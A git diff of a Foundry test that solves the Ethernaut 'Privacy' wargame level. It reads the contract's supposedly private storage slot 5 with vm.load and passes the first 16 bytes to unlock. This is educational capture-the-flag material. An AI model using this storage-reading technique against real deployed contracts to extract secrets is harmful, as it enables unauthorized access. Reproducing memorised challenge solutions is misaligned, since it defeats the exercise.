@@ -5,9 +5,11 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {PrivacyFactory} from "../src/factories/PrivacyFactory.sol";
 import {Privacy} from "../src/levels/Privacy.sol";
 
+import "forge-std/console.sol";
+
 contract PrivacyTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         PrivacyFactory factory = new PrivacyFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
@@ -16,8 +18,16 @@ contract PrivacyTest is EthernautTest {
     function testSolvePrivacy() public {
         Privacy instance = Privacy(payable(levelAddress));
 
-	// insert your code here!
-	
+        // [START]
+
+        bytes32 data = vm.load(levelAddress, bytes32(uint256(5)));
+
+        console.logBytes32(data);
+
+        instance.unlock(bytes16(data));
+
+        // [END]
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
 }
